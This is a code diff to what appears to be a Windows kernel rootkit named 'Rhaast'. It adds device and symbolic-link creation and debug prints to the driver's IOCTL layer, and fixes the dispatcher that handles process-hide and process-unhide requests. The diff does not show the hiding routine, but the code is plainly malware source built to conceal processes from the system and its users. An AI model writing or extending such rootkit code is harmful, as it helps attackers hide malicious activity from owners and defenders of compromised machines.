@@ -11,6 +11,8 @@ NTSTATUS TsIoCtlCreateClose(
     Irp->IoStatus.Status      = STATUS_SUCCESS;
     Irp->IoStatus.Information = 0;
 
+    PUTS( "open/close request has been made" )
+
     IofCompleteRequest( Irp, IO_NO_INCREMENT );
 
     return STATUS_SUCCESS;
@@ -19,13 +21,45 @@ NTSTATUS TsIoCtlCreateClose(
 /**
  * @brief
  *      initialize IoCtl transport functions
+ *      and create I/O Device & symbol link
+ *
+ * @return
+ *      NtStatus of function and it's operations
  */
-VOID TsIoCtlInit(
+NTSTATUS TsIoCtlInit(
     VOID
 ) {
+    UNICODE_STRING DeviceName = RTL_CONSTANT_STRING( RHAAST_DEVICE_NAME );
+    UNICODE_STRING SymbolLink = RTL_CONSTANT_STRING( RHAAST_SYMBOL_LINK );
+    NTSTATUS       NtStatus   = STATUS_SUCCESS;
+
+    /* set pointers */
     Instance.DriverObject->MajorFunction[ IRP_MJ_CREATE ]         = TsIoCtlCreateClose;
     Instance.DriverObject->MajorFunction[ IRP_MJ_CLOSE  ]         = TsIoCtlCreateClose;
     Instance.DriverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL ] = TsIoCtlDispatch;
+
+    /* create I/O Device */
+    if ( ! NT_SUCCESS( NtStatus = IoCreateDevice( Instance.DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &Instance.DeviceObject ) ) ) {
+        PRINTF( "IoCreateDevice Failed: %p\n", NtStatus )
+        goto FAILED;
+    }
+
+    /* create symbol link */
+    if ( ! NT_SUCCESS( NtStatus = IoCreateSymbolicLink( &SymbolLink, &DeviceName ) ) ) {
+        PRINTF( "IoCreateSymbolicLink Failed: %p\n", NtStatus )
+        goto FAILED;
+    }
+
+    /* we successful executed the function */
+    return STATUS_SUCCESS;
+
+FAILED:
+    if ( Instance.DeviceObject ) {
+        IoDeleteDevice( Instance.DeviceObject );
+        Instance.DeviceObject = NULL;
+    }
+
+    return NtStatus;
 }
 
 /**
@@ -49,10 +83,13 @@ NTSTATUS TsIoCtlDispatch(
     PIO_STACK_LOCATION IrpStack = NULL;
     NTSTATUS           NtStatus = STATUS_SUCCESS;
 
+    /* get current irp stack */
+    IrpStack = IoGetCurrentIrpStackLocation( Irp ); 
+
     /* dispatch IOCTL code */
     switch ( IrpStack->Parameters.DeviceIoControl.IoControlCode ) {
 
-        case RHAAST_IOCTL_PROCESS_HIDE:
+        case RHAAST_IOCTL_PROCESS_HIDE: PUTS( "RHAAST_IOCTL_PROCESS_HIDE" )
         {
             ULONG Pid = 0;
             
@@ -80,7 +117,7 @@ NTSTATUS TsIoCtlDispatch(
             break;
         }
 
-        case RHAAST_IOCTL_PROCESS_UNHIDE:
+        case RHAAST_IOCTL_PROCESS_UNHIDE: PUTS( "RHAAST_IOCTL_PROCESS_UNHIDE" )
         {
             ULONG Pid = 0;
 
